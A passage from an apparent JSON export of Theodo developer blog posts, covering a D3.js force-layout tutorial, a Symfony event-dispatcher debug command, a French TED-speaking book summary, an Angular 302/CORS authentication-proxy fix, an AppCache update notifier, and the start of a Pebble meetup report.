Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t.link {stroke: white; stroke-width: 1.2px;} .d3-force-layout-figure svg {display: block; margin: 0 auto;}\n\nvar w = 580, h = 400, backgroundColor = 'black';\nThe code shown below comes from the D3js website and the tons of examples it provides.\nWhat is the force layout?\nD3\u2019s layouts are methods that let you easily display complex datasets in relevant charts with little effort.\nYou can learn more about all of D3\u2019s layouts in the library\u2019s documenation.\nThe force layout, like all other layouts, provides us with tools that let us arrange our data on a chart. But it does so using physical simulation.\nHow is physical simulation relevant in dataviz?\nTake the messy chart below. All its points are randomly positioned inside the black container. But if you click on that mess\u2026\n\n\n\u2026 it triggers a physical simulation that gives sense to the previous mess, gently revealing the relations between all our datapoints.\nNoone had to set up the points\u2019 positions. They just figured out where to go by themselves.\nInserting points\nNow you understand why D3\u2019s force layout can be useful. Let\u2019s take some time to understand how it works. I will will walk you through a few examples showing what the force layout is made of and why it serves our purpose of displaying complex graphs.\nBut, what\u2019s a graph?\nA graph, in mathematics, is a set of vertices connected by edges. So, let\u2019s generate a few vertices inside our container.\nIn order to make the following examples interactive, we will add these points by moving our cursor over the workspace instead of, say, loading them from a file (like in the first example above).\n\n\nThere shall be movement\nWe would like to give these points some movement. We will give each point an impulsion based on our cursor\u2019s current and previous positions. To do so, we set each nodes\u2019 px and py properties with the variation of our cursor\u2019s x and y coordinates.\nBased on these properties, the force layout will handle the animation of all the points.\n\n\nObeying Newton\u2019s first law, our point float towards infinity\u2026\nSo let\u2019s set up a little friction to prevent them from going too far.\n\n\nD3 actually sets the friction parameter to 0.9 by default. So setting it yourself is not mandatory.\nOur scene is getting messy. There is no interaction between the points so they are overlapping each another. We can fix that by setting a repulsive force that will keep points apart. We do so by using the force layout\u2019s charge parameter and setting it to a negative value.\n\n\nOnce again, D3 sets the charge parameter to -30 by default.\nNow, our points keep pushing each other far outside our small SVG container. We can prevent this by using another handy tool: the gravity parameter. It simulates a force that attracts all the points towards the center of the container.\n\n\nI don\u2019t think Mike Bostock has implemented gravity into D3\u2019s force layout for the beauty of science. It allows us to keep our data points floating towards the center of our document instead of spreading randomly. That\u2019s pretty handy!\nGravity defaults to 0.1 so you don\u2019t necessarily have to set it yourself.\nIn the loop\nOk, now that we have grasped the basics of the force layout, I would like to take a step back and give you a hint of how this works.\nThe force layout runs a simulation that changes the positions of nodes according to a few laws of physics.\nAt every step, the new position of a node is computed based on its previous position and the various interactions it has with it\u2019s environment (friction, repulsion, gravity, etc.).\nYou can pause and resume this simulation whenever you want.\nIn the next example, the layout is stopped and started at every mouse click by using force.stop() and force.start() methods.\n\n\nThis looks quite good. But our data is not yet very interesting. There actually is no data at all.\nLet\u2019s add two random properties to each of our nodes: size and value. We will visualize these properties respectively as size and color.\n\n\nNodes are overlapping again. How can we fix this? We could set each node\u2019s charge depending on it\u2019s size but the nodes would still overlap for a short time before the layout stabilises. Plus there\u2019s a cooler thing I would like to show you.\nWe will add a collision detection function.\n\n\nTo achieve this effect, we hooked into the simulation loop, taking advantage of the tick event. This event is triggered at every step of the simulation and allows you to take control of everything that\u2019s happening in the force layout.\nforce.on('tick', function (e) {\r\n  var nodes = force.nodes();\r\n  var k = e.alpha * .1;\r\n  var q = d3.geom.quadtree(nodes),\r\n  i = 0,\r\n  n = nodes.length;\r\n  while (++i < n) q.visit(collide(nodes[i]));\r\n  svgContainer.selectAll('circle')\r\n    .attr('cx', function (d) { return d.x; })\r\n    .attr('cy', function (d) { return d.y; });\r\n});\nAdding links\nAs I said earlier, a graph is a set of vertices connected by edges. We have the vertices. Let's add the edges, or links, as they are called in D3. Every time we insert a new point in the graph below, we randomly connect it to an existing point.\n\n\nTo add a link in the simulation, you have to create an object with two straightforward properties:\nlink = {\r\n  source: node,\r\n  target: force.nodes()[Math.floor(Math.random() * force.nodes().length)]\r\n}\nAnd then you must insert the new link into the list of links handled by the simulation:\nforce.links().push(link);\nIf you wish the new link to show up on your screen, you need to bind it to an SVG line:\nsvgContainer.append('svg:line')\r\n  .data([link])\r\n  .attr('stroke', 'red')\r\n  .attr('stroke-width', 1.5);\nAnd finally you need to update each line's ends on every tick:\nsvgContainer.selectAll('line')\r\n  .attr('x1', function(d) { return d.source.x; })\r\n  .attr('y1', function(d) { return d.source.y; })\r\n  .attr('x2', function(d) { return d.target.x; })\r\n  .attr('y2', function(d) { return d.target.y; });\nConclusion\nI wrote this article after a presentation I gave at a recent Meetup about D3 in Paris. I had also made a quick comparison between svg and canvas when using the force layout. Stay tuned for a short article on that subject in the near future.\nThanks for reading and feel free to leave your comments below!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJean-R\u00e9mi Beaudoin\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tEver found yourself stuck in a stack of subscribers and listeners, unable to determine why and which class has modified your object after an event has been dispatched?\nThe old solution\nPreviously, you could search in your code for the name of the event. But even if you have a constant for the event name, sometimes listeners are registered directly in the Dependency Injection Container, or worse, dynamically.\nFurthermore, how to detect the execution order of the listeners? Does a higher priority imply an earlier execution? And what if two events have the same priority? You would have to know exactly how the framework works internally, and sometimes you just want a quick explanation of what is happening.\ndebug:event-dispatcher at the rescue\nTo face this, I proposed a new command in Symfony, available since version 2.6:\n$ app/console debug:event-dispatcher\r\n\nThe default behavior is to list all the events in your application which have at least one registered listener/subscriber, and give you all theses listeners/subscribers ordered by their descending priority (i.e. their execution order).\n[event_dispatcher] Registered listeners by event\r\n\r\n[Event] console.command\r\n+-------+-------------------------------------------------------------------------------+\r\n| Order | Callable                                                                      |\r\n+-------+-------------------------------------------------------------------------------+\r\n| #1    | Symfony\\Component\\HttpKernel\\EventListener\\DebugHandlersListener::configure() |\r\n| #2    | Symfony\\Bridge\\Monolog\\Handler\\ConsoleHandler::onCommand()                    |\r\n| #3    | Symfony\\Bridge\\Monolog\\Handler\\ConsoleHandler::onCommand()                    |\r\n+-------+-------------------------------------------------------------------------------+\r\n\r\n[Event] console.terminate\r\n+-------+-----------------------------------------------------------------------------------+\r\n| Order | Callable                                                                          |\r\n+-------+-----------------------------------------------------------------------------------+\r\n| #1    | Symfony\\Bundle\\SwiftmailerBundle\\EventListener\\EmailSenderListener::onTerminate() |\r\n.\r\n.\r\n.\r\n\nThe command fetches any listeners/subscribers, even if they are registered dynamically and not declared as services.\nDebug a specific event\nIf you want to debug a specific event, just give the event name to the command:\napp/console debug:event-dispatcher kernel.request\r\n\r\n[event_dispatcher] Registered listeners for event kernel.request\r\n\r\n+-------+----------------------------------------------------------------------------------+\r\n| Order | Callable                                                                         |\r\n+-------+----------------------------------------------------------------------------------+\r\n| #1    | Symfony\\Component\\HttpKernel\\EventListener\\DebugHandlersListener::configure()    |\r\n| #2    | Symfony\\Component\\HttpKernel\\EventListener\\ProfilerListener::onKernelRequest()   |\r\n| #3    | Symfony\\Component\\HttpKernel\\EventListener\\DumpListener::configure()             |\r\n| #4    | Symfony\\Bundle\\FrameworkBundle\\EventListener\\SessionListener::onKernelRequest()  |\r\n| #5    | Symfony\\Component\\HttpKernel\\EventListener\\FragmentListener::onKernelRequest()   |\r\n| #6    | Symfony\\Component\\HttpKernel\\EventListener\\RouterListener::onKernelRequest()     |\r\n| #7    | Symfony\\Component\\HttpKernel\\EventListener\\LocaleListener::onKernelRequest()     |\r\n| #8    | Symfony\\Component\\HttpKernel\\EventListener\\TranslatorListener::onKernelRequest() |\r\n| #9    | Symfony\\Component\\Security\\Http\\Firewall::onKernelRequest()                      |\r\n| #10   | Symfony\\Bundle\\AsseticBundle\\EventListener\\RequestListener::onKernelRequest()    |\r\n+-------+----------------------------------------------------------------------------------+\r\n\nFeedback and contributions welcome\nDo you find this command useful? Do you have suggestions to improve the readability? Feel free to comment here, open a issue or propose a Pull Request on Github.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMatthieu Auger\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIl y a quelques mois, je suis tomb\u00e9 par hasard sur une vid\u00e9o du site ted.com et j\u2019ai tout de suite accroch\u00e9. Pour ceux qui ne connaissent pas, les conf\u00e9rences TED sont une suite de talks d\u2019une dizaine de minutes sur pleins de sujets diff\u00e9rents.Je suis all\u00e9 sur le site et j\u2019ai alors commenc\u00e9 \u00e0 encha\u00eener les vid\u00e9os. Je me suis alors fait la promesse de ne plus regarder de s\u00e9ries mais des vid\u00e9os TED afin de me coucher un peu moins b\u00eate tous les soirs.\nAujourd\u2019hui, je continue d\u2019en regarder fr\u00e9quement m\u00eame si Game of Thrones a eu raison de ma promesse. C\u2019est pourquoi quand mon coll\u00e8gue Jonathan m\u2019a parl\u00e9 du livre dont je vais vous faire le r\u00e9sum\u00e9, j\u2019ai tout de suite saut\u00e9 sur l\u2019occasion. Il s\u2019agit de \u201cR\u00e9v\u00e9lez le speaker qui est en vous\u201d de Michel L\u00e9vy-Proven\u00e7al dont je recommande fortement la lecture si vous voulez vous exprimer en public lors d\u2019une conf\u00e9rence ou d\u2019un talk.\nMichel L\u00e9vy-Proven\u00e7al s\u2019occupe de TEDxParis et il utilise sa m\u00e9thode BRIGHTNESS pour coacher les talkers.\nVision g\u00e9n\u00e9rale du talk\nIl faut tout d\u2019abord trouver le message que vous voulez transmettre \u00e0 votre public.\nLe message doit \u00eatre adapt\u00e9 au public et doit pouvoir se r\u00e9sumer tr\u00e8s facilement, sous forme d\u2019un tweet par exemple. La r\u00e8gle importante \u00e0 retenir est : \u201cUn talk, un message\u201d. Ensuite il faut se demander :\n\u201cQue voulez-vous transmettre ? Est-ce une information cl\u00e9 ? Un call to action pour inviter les gens \u00e0 se sentir concern\u00e9?\nLe partage d\u2019une vision, d\u2019une expertise, la conclusion d\u2019une exp\u00e9rience v\u00e9cue ?\u201d\nL\u2019envie de transmettre est importante, si vous l\u2019avez durant le talk cela se ressentira.\nIl faut \u00e9viter de faire de la pub pour un produit mais plut\u00f4t expliquer pourquoi il r\u00e9pond \u00e0 un probl\u00e8me qui concerne beaucoup de gens.\nSur ce point, je vous conseille personnellement ce talk \u201cHow great leaders inspire action\u201d\nPuis, il faut d\u00e9terminer \u00e0 quel type de public on s\u2019adresse :\n\n\n\u00c0 quel point pouvez-vous \u00eatre familier ? Est-ce qu\u2019on s\u2019adresse \u00e0 des militaires retrait\u00e9s ou \u00e0 de jeunes \u00e9tudiants ?\n\n\nQuel est le niveau de connaissance du public sur le sujet ? Coll\u00e8gues du CNRS ou grand public ? Cela va avoir un impact important sur le vocabulaire que l\u2019on va pouvoir employer. Attention au jargon pour certains publics.\n\n\nStructure du talk\nL\u2019introduction\nL\u2019introduction doit rentrer directement dans le vif du sujet, il ne faut pas perdre de temps. L\u2019auteur conseille donc de ne pas faire de pr\u00e9sentation, ni de remerciement, quitte \u00e0 passer pour un malpoli. Vous pourrez toujours les faire en dehors du talk.\nIl faut savoir saisir l\u2019attention d\u00e8s les premiers instants avec au choix :\n\nun fait marquant : \u201dSavez-vous que le dernier iPhone est livr\u00e9 avec un t\u00e9l\u00e9phone Android de secours ?\u201d\nune anecdote personnelle : \u201cJ\u2019ai commenc\u00e9 \u00e0 coder avec visual basic \u00e0 10 ans\u201d\nune citation : \u201c\u00e7a marche en local, je ne vois vraiment pas ce qui peut tourner mal\u201d \u2013 Un dev Windows Millenium\nune statistique : \u201cL\u2019appli est stable, les tests passent 4 fois sur 5\u201d\nune question : \u201cQui dans cette salle utilise encore IE6 ?\u201d\n\nAvec ceci avec comme sentiment recherch\u00e9 :\n\nl\u2019occasion d\u2019apprendre quelque chose \nsusciter l\u2019\u00e9tonnement \nun \u00e9clat de rire \nun sentiment d\u2019empathie \u00e0 notre \u00e9gard\n\nCela aura pour effet de vous rendre plus proche de votre public et d\u2019attirer son attention pour la suite du talk. Ces premi\u00e8res secondes sont \u00e0 la fois tr\u00e8s importantes et tr\u00e8s stressantes : c\u2019est le starter. C\u2019est la partie du talk o\u00f9 on doit absolument tout savoir par coeur.\nUne fois l\u2019attention obtenue, il faut poser les bases du talk et introduire le probl\u00e8me \u00e0 r\u00e9soudre, la question \u00e0 laquelle il faut r\u00e9pondre. Il est important que le public puisse s\u2019identifier au probl\u00e8me afin d\u2019embarquer avec vous dans ce bref voyage qu\u2019est le talk.\nLe squelette du talk\nPour structurer le talk, l\u2019auteur propose de le voir comme le passage d\u2019une berge \u00e0 une autre.\n\u201cIl faut poser de grosses pierres, des points de passages au milieu de la rivi\u00e8re pour pouvoir passer.\u201d\nNotre travail \u00e9tant de trouver ces pierres pour le talk. Il propose 7 points de passages mais ce chiffre peut \u00e9voluer selon la longueur du talk.\nCes points de passages peuvent \u00eatre :\n\nune image\nune anecdote\nune phrase\nun mot-cl\u00e9\n\nIls doivent \u00eatre pr\u00e9cis et clairement d\u00e9finis et nous permettre de bien nous rep\u00e9rer dans le talk.\nPour le contenu, s\u2019armer de phrases percutantes le long de ces points de passage est d\u2019une grande utilit\u00e9. N\u2019h\u00e9sitez pas \u00e0 faire des analogies comme \u201cune hydrolienne est grande comme un immeuble de 7 \u00e9tages\u201d. Essayer d\u2019utiliser des mottoes, ces petites phrases qui se retiendront bien comme \u201cStay foolish, stay hungry\u201d. Pensez \u00e0 prendre des exemples que le public pourra appr\u00e9hender et si vous pouvez faire passer vos id\u00e9es avec de l\u2019\u00e9motion et/ou de l\u2019humour c\u2019est le top.\nLa conclusion\nAu moins aussi importante que l\u2019introduction, la conclusion permet de d\u00e9livrer le message que l\u2019on veut transmettre. Elle doit rester simple, n\u2019oubliez pas : \u201cUn talk, un message\u201d. Plus vous ajoutez de choses \u00e0 la conclusion plus elles perdent en importance. Pensez \u00e0 faire une ouverture sur un probl\u00e8me plus large pour inspirer le public. La derni\u00e8re phrase, le cut-off, est aussi d\u00e9cisive que le starter et doit \u00eatre travaill\u00e9e avec la m\u00eame intensit\u00e9. Cela peut \u00eatre une action avec le public, la r\u00e9v\u00e9lation d\u2019un r\u00e9sultat final, une phrase choc, un appel \u00e0 l\u2019action, une blague, une r\u00e9flexion philosophique\u2026\nL\u2019illustration\nL\u2019illustration d\u2019un talk ne comporte pas obligatoirement de slide, cela peut \u00eatre d\u2019autres supports comme la vid\u00e9o, de l\u2019infographie, des objets sur la sc\u00e8ne ou m\u00eame rien du tout.\nIl faut garder en t\u00eate que l\u2019illustration est un support et que le point de d\u00e9part est avant tout votre discours : \u201cla star doit rester l\u2019intervenant, pas le slide !\u201d.\n\u00c0 propos des slides, il faut \u201cdistinguer deux supports : le slide destin\u00e9 \u00e0 \u00eatre lu (\u00e9crit, imprim\u00e9, donn\u00e9 \u00e0 lire au client) et le slide destin\u00e9 \u00e0 \u00eatre vu sur un \u00e9cran derri\u00e8re vous lors d\u2019une pr\u00e9sentation\u201d. Le premier type sera un slide-document ou slidument, riche en informations et en complexit\u00e9. Le deuxi\u00e8me type devra \u00eatre son oppos\u00e9 : peu de contenu et appr\u00e9hendable en quelques secondes. Si une de vos slides est trop complexe, d\u00e9coupez-la en plusieurs moins complexes. Vous pouvez pr\u00e9parer les deux types si vous voulez laisser une trace \u00e9crite par la suite.\nPour la forme il faut rester simple. Utiliser le moins que possible les \u201cbullet points\u201d est une r\u00e8gle qui commence \u00e0 \u00eatre bien connue. \u00c0 la place, utilisez des images ou des pictogrammes qui permettront de rendre la pr\u00e9sentation plus ludique et plus jolie. Deux couleurs par slide en privil\u00e9giant les fonds sombres. Les caract\u00e8res avec serif pour les textes \u00e9crits en petit et sans serif pour les textes \u00e9crits en gros comme les titres. Pour les polices il est \u00e9galement conseill\u00e9 d\u2019en utiliser maximum deux diff\u00e9rentes. Pour pr\u00e9senter de la data, inspirez-vous des derni\u00e8res m\u00e9thodes \u00e0 la mode dans la data visualization.\nLa r\u00e9p\u00e9tition de votre talk est incontournable surtout pour les parties les plus importantes comme l\u2019introduction et la conclusion. Elle ne permet pas seulement de se souvenir du texte et de prendre de la confiance mais elle permet \u00e9galement de l\u2019am\u00e9liorer \u00e0 chaque fois. Pensez \u00e0 vous enregistrer avec votre t\u00e9l\u00e9phone pour pouvoir vous \u00e9couter. Une vraie r\u00e9p\u00e9tition doit se faire devant au moins une autre personne. Vous devez pouvoir incarner votre talk et de ce fait pensez aux acteurs qui r\u00e9p\u00e8tent plusieurs fois leur pi\u00e8ce. Il est important d\u2019arriver avec l\u2019envie et le plaisir de transmettre le message.\nPour les mouvements, une r\u00e8gle simple : soit vous parlez, soit vous bougez, car contrairement \u00e0 une id\u00e9e re\u00e7ue, marcher quand on parle ne donne pas plus de pr\u00e9sence mais au contraire affaiblit la puissance de votre discours.\nJe vous conseille pour finir cet excellent talk \u201cHow to speak so that people want to listen\u201d.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you\u2019ve ever developed web applications for a large company, you must be familiar with having authentication done by a third-party proxy. And by third-party I mean handled by another team.\nThis is what our full stack javascript app architecture looks like:\n\nThe proxy is the door to your application, so it\u2019s paramount that it behaves the way you expect it to. For instance when your session expires, you might expect a 401 from this proxy and build your app\u2019s response around that. If you get a 302 instead, your app won\u2019t work properly.\nWhen the proxy\u2019s behavior is controlled by another team, having to require their help takes time and introduces delays, so generally you try to make do with what you have! Following is a quick overview of how our team dealt with such a situation.\nDiagnosis\nIn our case, we were having problems with API calls from our application:\nXMLHttpRequest cannot load https://auth-server.com?sourceUrl=https%3A%2F%2Fmy-app.com%2Fapi%2Fexample. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin https://my-app.com/api/example is therefore not allowed.\r\n\nis the chrome console error we kept having. After looking it up, this is what you get when trying to make a cross-domain ajax call.\nBy default, you are not allowed to request a resource from another domain via an ajax call. This prevents security issues such as cross-site scripting (XSS) attacks.\nThis is why none of our API calls actually went through.\n\nSince our application is cached (via a cache manifest), when trying to use it while our authentication session has expired, we only fire ajax API calls to https://my-app.com/api/example. Unfortunately those calls are blocked and in the end, the user is never redirected to the login page.\nHow to allow cross-domain calls\nCalling an asset via an ajax call is possible only if the domain which hosts that asset allows it. You can enable it by adding this header:\nAccess-Control-Allow-Origin: https://my-app.com\nFor the record, this header comes along with 3 others, which help you narrow down the rule to your specific need:\nAccess-Control-Allow-Methods: POST, GET, HEAD, OPTIONS\r\nAccess-Control-Allow-Headers: X-PINGOTHER\r\nAccess-Control-Max-Age: 1728000\r\n\nIntercepting a 302 with Angular\nSuppose we convince the authentication team to add the right header, we should then be able to intercept their 302 response whenever we fire a API call while unauthenticated. Right? This is how you intercept a specific http code with angular:\nangular.module('http-auth-interceptor', ['http-auth-interceptor-buffer'])\r\n.factory('httpMovedInterceptor', function($window, $location){\r\n  return {\r\n    response: function(rejection) {\r\n      var loginPage = 'https://auth-server.com/login'\r\n      if (rejection.status == 302 && rejection.config.url.split('?')[0] == loginPage) {\r\n        return $window.location.href = loginPage + '?sourceUrl=' + encodeURIComponent($location.absUrl())\r\n      }\r\n    }\r\n  };\r\n})\r\n.config(['$httpProvider', function($httpProvider) {\r\n  $httpProvider.interceptors.push('httpMovedInterceptor');\r\n}])\r\n...\r\n\nFirst we create a factory to intercept 302 responses, then we register it with the $httpProvider.\nUnfortunately this wouldn\u2019t work! The 302 http code is dealt with at a browser level \u2013 as shown on below figure, meaning that your app cannot intercept the 302 in time and instead gets the 200 from the login page.\n\nSolution\nIdeal\nLet\u2019s stay pragmatic here! Probably the easiest and most efficient solution is to ask the authentication team to change the proxy\u2019s response from 302 to 401. This way, you can easily detect when your API calls fail and \u2018manually\u2019 redirect your browser to your authentication login page.\nHowever, the authentication team may not be able to comply with that need. For instance, if they have other teams excepting a 302 and cannot work on a case-by-case basis.\nWorkaround\nIf you have to stick with the 302s, what you\u2019re left with is analyzing the API call responses and whenever you get a 200 code and page url that corresponds to your page login, you manually force your browser to load that page with:\n$window.location.href = <you login page url>\nConclusion\nProxies which send you 302s on authentication can be a nightmare to deal with when developing API based applications. Do ask for 401s instead in response to any unauthenticated API calls. If that\u2019s not achievable, you\u2019ll have to expect your login page as a response to your ajax call and manually redirect to the login page in your browser.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarc Perrin-Pelletier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIt is common, for web developers, to assume that users will always use their products\u00a0in near-optimal situations: a recent browser on a fast device, with a steady WiFi\u00a0connection. However, when building mobile-first webapps, the last assumption is a\u00a0dangerous one to make. Network connectivity on mobile devices is all but granted: a poor\u00a0cellular reception, a subway ride or a remote holiday estination can have disastrous\u00a0impacts on the user experience.\nIn this excellent A List Apart article, Alex Feyerke notes that developers should \u201cstop\u00a0treating offline like an error\u201d:\nStop treating a lack of connectivity like an error. Your app should be able to handle\u00a0disconnections and get on with business as gracefully as possible.\nOffline-first webapps are a gracious way to guarantee a worst-case user experience that\u00a0can be controlled and fine-tuned by developers. Their implementations usually rely\u00a0heavily on the Application Cache, an HTML5 flagship feature used to specify which resources\u00a0must be cached by the browser for the app (or a predefined subset of the app) to keep working\u00a0without any network connectivity.\nI am currently working on a offline-first project, and a problem arose: as the browser\u00a0cached all static assets (stylesheets, vendor libraries and the AngularJS app), users were\u00a0not systematically browsing the latest version of the website. This was contradicting the\u00a0premise of the Agile philosophy, as we wouldn\u2019t have user feedback as quickly as we wished\u00a0on the recently pushed functionalities.\nThe solution we envisioned was to prompt the user a message each time a new build was pushed in production, notifying them of the update and inviting them to refresh the page to enjoy the latest version. In this article I will try and explain as precisely as possible the implementation of this feature.\nThe cache manifest\nThe cache manifest is the file that indicates to the browser which folders or files to cache.\u00a0The browser will only update the cached files (retrieving them from the server) when the\u00a0cache manifest is modified. It is thus possible to include a commented line in the\u00a0manifest, and to modify this line in order to notify the browser that the source code has\u00a0been updated.\nFor convenience, we used a gulp plugin named gulp-manifest which programmatically\u00a0generates a manifest file with each build, and appends to it a commented sha256 hash\u00a0of all source files. That way, each build will trigger a cache refresh on client browsers.\nIt is important that the manifest file is served with a particular MIME type: text/cache-manifest. Otherwise, browsers will not recognize the manifest and cache the files. Webservers must be configured accordingly (considering that the manifest file has the extension .appcache):\n\nNginx in the mime.types file, add the following line: text/cache-manifest appcache;\nApache: in the .htaccess file, add the following line: AddType text/cache-manifest .appcache\nExpress: add the following route:\n\napp.get '/*.appcache', (req, res) ->\r\n  res.header 'Content-Type', 'text/cache-manifest'\r\n  res.end 'CACHE MANIFEST'\r\n\nThe Angular directive\nWe built an Angular directive that shows a non-intrusive alert at the top of the page to\u00a0notify the user of an update.\nThe controller runs a routine every minutes, checking the status of the\u00a0window.applicationcache variable. If an update is available, the cache is updated, then\u00a0the alert is displayed, prompting the user to reload the page for the changes to be\u00a0applied.\ndirective.coffee:\nangular.module 'refresh-app' \r\n.directive 'refreshApp', -> \r\n  restrict: 'A'\r\n  templateUrl: 'utils/refresh-app/template.html' \r\n  controller: 'controller' \r\n  scope: {} \r\n  link: ($scope, element, attrs) -> \r\n    $scope.$watch 'hidden', (newValue) -> \r\n      return element.slideUp() if newValue \r\n      element.slideDown() if not newValue\r\n\ncontroller.coffee:\nangular.module 'refresh-app' \r\n.controller 'refreshAppController', ($scope, $timeout, $window) -> \r\n  $scope.hidden = true \r\n  appCache = $window.applicationCache\r\n  $scope.close = -> \r\n    closed = true \r\n    $scope.hidden = true\r\n\r\n  if appCache and appCache.status isnt (appCache.UNCACHED or appCache.OBSOLETE)\r\n    appCache.addEventListener 'updateready', -> \r\n      # Listener for when a new version is available\r\n      $scope.hidden = false if appCache.status is appCache.UPDATEREADY\r\n\r\n      checkForUpdates = -> appCache.update() \r\n        # Chech every minute if a new version is available \r\n        $timeout checkForUpdates, 60 * 1000\r\n\r\n      checkForUpdates() # Launches the routine\r\n\ntemplate.jade:\n.container\r\n  button.close( \r\n    type='button'\r\n    aria-hidden='true'\r\n    ng-click='close()'\r\n  ) &times; \r\n  p A new version of this app is available&emsp;\r\n  button.refresh-app-btn(onclick='window.location.reload()') \r\n    i.glyphicon.glyphicon-refresh\r\n    | Update  \r\n\nA message is now displayed when the app cache was updated:\n\nThe HTTP cache headers\nCache headers are inserted by the webserver to indicate to the browser which files must not\u00a0be cached, or the maximum amount of times files can be kept in the cache. In our project,\u00a0we wanted the browser to cache only the assets files (for offline browsing), not\nAPI calls (for security reasons). We had to apply cache headers selectively on our\u00a0webserver, here Express:\n# Assets routes, caching is authorized \r\napp.use('/assets/', express.static(__dirname+'/../www')) \r\napp.use(express.static(__dirname+'/../www'))\r\n\r\n# Avoid caching API results: apply cache headers \r\napp.use (req, res, next) -> \r\n  res.header 'Cache-Control', 'no-cache, no-store, must-revalidate' \r\n  res.header 'Pragma', 'no-cache'\r\n  res.header 'Expires', 0 \r\n  next()\r\n\r\n# API routes, caching is not authorized \r\napp.use('/api/v1/', (req, res) -> \r\n  console.log 'Api calls\u2026' \r\n\nNote: the Pragma header is the HTTP/1.0 version of the Cache-Control header\nIn the case where cache headers are still present on static files, a proxy may be\u00a0intercepting responses. It is then possible to modify the Apache or Nginx configuration to\u00a0remove the cache headers.\nA particular attention must be paid to the cache-control: no-store header. Indeed, this\u00a0header is set alongside with a cache manifest, files will keep being cached on Chrome,\u00a0Opera and Safari, but not on Firefox.\nDebugging the offline webapp\nBrowsers offers a set of tools to debug an offline-ready webapp, which can be very\u00a0practical to detect errors in the manifest file.\nOn Chrome\nChrome offers an interface to see which apps are cached by the browser, and for each the\u00a0details of the cached files.\nIn the searchbar, enter chrome://appcache-internals to display the list of cached apps.\n\nOn Firefox\nFirefox offers a command line interface to nevigate within the application cache.\nTo open the CLI, enter <shift><F2>. The command help appcache displays the list of\u00a0available appcache commands :\n\nConclusion\nAutomatic updates are great for both the developers, who benefit from faster feedback on\u00a0new features, and the users, whose application is always up-to-date. It also eases greatly\u00a0the testing and development process, as cache must not be emptied each time an update is pushed.\u00a0A nice addition in our Agile toolbox !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Goutay\r\n  \t\t\t\r\n  \t\t\t\tWebdeveloper at Theodo. Webdesign & UX enthusiast.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tPebble Meetup 2015-06-01 @Ecole 42\n\nI went to a Pebble meetup at Ecole 42, and since I\u2019m really into connected objects, I discovered there some awesome things that you can do with the Pebble watch that I would like to share with my fellow Connected Objects enthusiasts. Firstly I would like to share some of the greatest moments of the talks of Thomas Sarlandie (@sarfata) Developer Evangelist at Pebble and of the lightning talks (lasting from 5 to 10 minutes) that followed, then what I like most about the Pebble.\nThomas\u2019 introduction on Pebble\nThomas first described what Pebble is: it\u2019s a smartwatch quite unlike the others since it has no touch screen, instead it has 4 buttons. Why is that? It allows Pebble to have a much longer battery life: from 4 to 7 days.\nHe then delved into Pebble\u2019s features (which you can find listed here). Pebble is equipped with an accelerometer, a compass and an ambient light sensor and you can connect it to your smartphone by bluetooth 4.0. Some things to note: Pebble has 128kB of RAM so if you decide to jump in and develop your own pebble app, you might have to optimize your code in order to have it run smoothly.\nWatchfaces and apps\nThere are two kinds of apps that you can install on Pebble: watchfaces which allow you to customize the display of the hour (by adding weather or activity 